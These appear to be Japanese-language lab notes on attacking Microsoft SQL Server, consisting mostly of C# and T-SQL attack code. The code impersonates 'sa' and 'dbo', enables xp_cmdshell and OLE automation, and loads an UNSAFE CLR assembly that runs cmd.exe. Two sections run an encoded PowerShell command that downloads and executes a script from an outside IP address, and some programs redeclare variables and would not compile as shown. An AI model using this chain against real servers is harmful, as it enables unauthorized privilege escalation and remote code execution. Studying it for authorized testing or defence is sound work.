# Impersonate
impersonate権限を持つユーザを利用して権限昇格をする方法

impersonate列挙コード+saログインへのなりすまし
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while(reader.Read() == true)
            {
              Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
            Console.WriteLine("Before impersonation");
			String querylogin = "SELECT SYSTEM_USER;";
			SqlCommand command = new SqlCommand(querylogin, con);
			SqlDataReader reader = command.ExecuteReader();
			reader.Read();
			Console.WriteLine("Executing in the context of: " + reader[0]);
			reader.Close();
			
			String executeas = "EXECUTE AS LOGIN = 'sa';";
			command = new SqlCommand(executeas, con);
			reader = command.ExecuteReader();
			reader.Close();
			
			Console.WriteLine("After impersonation");
			querylogin = "SELECT SYSTEM_USER;";
			command = new SqlCommand(querylogin, con);
			reader = command.ExecuteReader();
			reader.Read();
			Console.WriteLine("Executing in the context of: " + reader[0]);
			reader.Close();

            con.Close();
        }
    }
}
```

データベースサーバーを完全に侵害するためには、なりすます対象のデータベースユーザーが、`TRUSTWORTHY`プロパティが設定されているデータベースに所属している必要
`TRUSTWORTHY`プロパティが有効になっているネイティブデータベースは`msdb`だけ
`guest`ユーザーには`msdb`内で`dbo`になりすます権限が与えられている（設定不備）

dboユーザへの成りすまし
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while(reader.Read() == true)
            {
              Console.WriteLine("Logins that can be impersonated: " + reader[0]);
            }
			Console.WriteLine("Before impersonation:");
			String querylogin = "SELECT USER_NAME();";
			SqlCommand command = new SqlCommand(querylogin, con);
			SqlDataReader reader = command.ExecuteReader();
			reader.Read();
			Console.WriteLine("Executing in the context of: " + reader[0]);
			reader.Close();
			
			String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
			
			command = new SqlCommand(executeas, con);
			reader = command.ExecuteReader();
			reader.Close();
			
			Console.WriteLine("After impersonation:");
			querylogin = "SELECT USER_NAME();";
			command = new SqlCommand(querylogin, con);
			reader = command.ExecuteReader();
			reader.Read();
			Console.WriteLine("Executing in the context of: " + reader[0]);
			reader.Close();


            con.Close();
        }
    }
}
```

# Code Execution
`sysadmin`ロールメンバーシップを持つユーザでは`xp_cmdshell`ができる
`xp_cmdshell`の代替え手段として、`sp_OACreate`も可能

### xp_cmdshellを利用したリモート実行
saログインへのなりすまし、詳細オプションの有効化、xp_cmdshellの有効化、そして

whoamiコマンドの実行を行うコード
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = "EXEC xp_cmdshell 'powershell.exe -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1AC8AcgB1AG4AMQAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=';";

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}
```

### sp_OACreate
OLEオブジェクトを有効化し、sp_OACreateとsp_OAMethodの両方を呼び出すC#コード
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
	        String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
	        String enable_ole = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
			String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell.exe -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA1AC8AcgB1AG4AMQAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=';";
	
	        SqlCommand command = new SqlCommand(impersonateUser, con);
	        SqlDataReader reader = command.ExecuteReader();
	        reader.Close();
	
	        command = new SqlCommand(enable_ole, con);
	        reader = command.ExecuteReader();
	        reader.Close();
	
	        command = new SqlCommand(execCmd, con);
	        reader = command.ExecuteReader();
	        reader.Close();
	
	        con.Close();
        }
    }
}
```


# Custom Assembries
CLEストアドプロシージャを使用してDLLを実行することが可能

実行用のDLL作成
```c#
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

public class StoredProcedures
{
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void cmdExec (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
        SqlContext.Pipe.SendResultsStart(record);
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
        SqlContext.Pipe.SendResultsRow(record);
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }
};
```

16進数に変換
```powershell
$assemblyFile = "C:\Users\offsec\source\repos\SQL\cmdExec\bin\x64\Release\cmdExec.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder 

$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
# 出力されるのは16進数だが先頭に0xついてないので、0xつけること
```

CLRストアドプロシージャを利用した任意コードの実行
```c#
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
           
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }
            
	        String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
	        String enable_clr = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
	        String cleanup = "use msdb; " +
    "IF EXISTS (SELECT * FROM sys.objects WHERE type IN ('P','PC') AND name = 'cmdExec') DROP PROCEDURE dbo.cmdExec; " +
    "IF EXISTS (SELECT * FROM sys.assemblies WHERE name = 'cmdexec') DROP ASSEMBLY cmdexec; " +
    "IF EXISTS (SELECT * FROM sys.assemblies WHERE name = 'my_assembly') DROP ASSEMBLY my_assembly;";
		    String execcmd = "use msdb; CREATE ASSEMBLY my_assembly FROM <入れた想定です。> WITH PERMISSION_SET = UNSAFE;";
		    String createproc = "use msdb; CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmdExec];";
		    String runcmd = "use msdb; EXEC cmdExec 'whoami';";
	
	        SqlCommand command = new SqlCommand(impersonateUser, con);
	        SqlDataReader reader = command.ExecuteReader();
	        reader.Close();
	        
			command = new SqlCommand(cleanup, con);
			reader = command.ExecuteReader();
			reader.Close();
			
	        command = new SqlCommand(enable_clr, con);
	        reader = command.ExecuteReader();
	        reader.Close();
	        
	        command = new SqlCommand(execcmd, con);
	        reader = command.ExecuteReader();
	        reader.Close();
	        
	        command = new SqlCommand(createproc, con);
	        reader = command.ExecuteReader();
	        reader.Close();
	        
	        command = new SqlCommand(runcmd, con);
	        reader = command.ExecuteReader();
	        reader.Close();
	        
	        con.Close();
        }
    }
}
```